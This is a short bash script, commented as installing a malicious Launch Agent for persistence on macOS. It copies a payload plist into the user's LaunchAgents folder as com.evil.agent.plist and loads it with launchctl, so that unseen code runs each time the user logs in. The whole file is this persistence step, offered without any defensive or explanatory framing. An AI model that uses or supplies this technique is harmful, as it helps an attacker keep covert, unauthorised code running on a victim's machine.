#!/bin/bash
# Installs a malicious Launch Agent for persistence
cp payload.plist ~/Library/LaunchAgents/com.evil.agent.plist
launchctl load ~/Library/LaunchAgents/com.evil.agent.plist
